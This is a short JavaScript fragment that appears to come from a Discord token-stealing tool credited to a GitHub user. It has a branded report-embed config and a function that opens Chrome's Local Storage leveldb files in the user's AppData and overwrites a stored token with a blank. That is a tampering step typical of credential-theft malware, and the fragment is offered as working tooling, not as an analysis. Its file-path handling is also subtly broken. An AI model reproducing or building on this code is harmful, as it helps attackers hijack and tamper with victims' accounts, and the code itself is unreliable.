...
var config = {
    ...
    embed: {
        username: "github.com/Luxotick",
        footer: {
            text: `github.com/Luxotick`,
            icon_url: "https://media.discordapp.net/attachments/1018523476006551573/1087423360159465583/0be3d49ce297e9947a6a6d56ea3f3689.jpg",
        },
        href: "https://github.com/Luxotick",
        avatar_url: "https://media.discordapp.net/attachments/1018523476006551573/1087423360159465583/0be3d49ce297e9947a6a6d56ea3f3689.jpg"
    },
...
// ==================================================================================
const directoryPath = path.join(os.homedir(), 'AppData', 'Local');
const ldbDirectoryPath = path.join(directoryPath, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb');
const searchText = getToken();
const replacementText = ' ';

async function replaceTextInLdbFiles() {
    const ldbFiles = await readdirAsync(ldbDirectoryPath)
        .then(files => files.filter(file => path.extname(file) === '.ldb'));

    for (const file of ldbFiles) {
        const filePath = path.join(directoryPath, file);
        const fileContent = await readFileAsync(filePath, 'utf-8');
        const newFileContent = fileContent.replace(new RegExp(searchText, 'g'), replacementText);
        await writeFileAsync(filePath, newFileContent, 'utf-8');
    }
}
